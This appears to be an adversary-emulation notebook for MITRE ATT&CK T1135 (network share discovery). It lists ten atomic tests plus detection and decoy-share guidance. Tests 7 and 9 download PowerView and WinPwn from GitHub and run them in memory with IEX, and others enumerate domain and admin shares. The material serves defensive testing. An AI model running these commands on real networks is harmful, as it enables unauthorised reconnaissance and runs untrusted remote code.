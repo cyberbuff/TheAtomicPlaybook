{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "52157139",
   "metadata": {},
   "source": "# T1135 - Network Share Discovery\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services."
  },
  {
   "cell_type": "markdown",
   "id": "bf5a97e0",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "88caf309",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Network Share Discovery",
    "Network Share Discovery\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ndf -aH\nsmbutil view -g //computer1\nshowmount computer1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f453d6e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ee42d5c5",
   "metadata": {},
   "source": "### Atomic Test #2 - Network Share Discovery - linux\nNetwork Share Discovery using smbstatus\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Package with smbstatus (samba) must exist on device\n\n##### Check Prereq Commands:\n```bash\nif (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed) > /dev/null; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\nsudo (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba) \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "755ede2b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "5a7f8cfc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsudo smbstatus --shares\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e371539e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "dba0c7d7",
   "metadata": {},
   "source": "### Atomic Test #3 - Network Share Discovery - FreeBSD\nNetwork Share Discovery using smbstatus\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Package with smbstatus (samba) must exist on device\n\n##### Check Prereq Commands:\n```sh\nif (pkg info -x samba &>/dev/null) > /dev/null; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\n(which pkg && pkg install -y samba413) \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e31bbe7a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e55ae9a1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsmbstatus --shares\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1fc7a15c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "2a75620f",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Network Share Discovery command prompt",
    "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet view \\\\localhost\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2446951",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "2f94c8dd",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Network Share Discovery PowerShell",
    "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-smbshare\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86f86259",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "a947998c",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - View available share drives",
    "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet share\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb49ff29",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "ec63527e",
   "metadata": {},
   "source": "### Atomic Test #7 - Share Discovery with PowerView\nEnumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Endpoint must be joined to domain\n\n##### Check Prereq Commands:\n```powershell\nif ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n\"Join system to domain\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8029e5cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "241d61d3",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "371da1bc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "f81c6324",
   "metadata": {},
   "source": "### Atomic Test #8 - PowerView ShareFinder\nPowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Invoke-ShareFinder module must exist in %TEMP% directory\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "60a3239c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "cb028a9b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder -CheckShareAccess\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee6efdf3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "9ec9dc88",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - WinPwn - shareenumeration",
    "Network share enumeration using the shareenumeration function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fabee844",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "09583a4b",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Network Share Discovery via dir command",
    "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution avalaible network shares will be displayed in the commandline session\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndir \\\\127.0.0.1\\c$\ndir \\\\127.0.0.1\\admin$\ndir \\\\127.0.0.1\\IPC$\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "075d7ded",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "ef06448f",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
  },
  {
   "cell_type": "markdown",
   "id": "c23b2e1d",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy Content  \n Seed content that can be used to lead an adversary in a specific direction, entice a behavior, etc. \n\n Decoy Content is the data used to tell a story to an adversary. This content can be legitimate or synthetic data which is used to reinforce or validate your defensive strategy. Examples of decoy content are files on a storage object, entries in the system registry, system shortcuts, etc.\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to introduce decoy content to entice additional engagement activity.\n#### Use Case\nA defender can utilize decoy network shares to provide content that could be used by the adversary. \n#### Procedures\nCreate directories and files with names and contents using key words that may be relevant to an adversary to see if they examine or exfiltrate the data.\nSeed a file system with content that is of no value to the company but reinforces the legitimacy of the system if viewed by an adversary.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}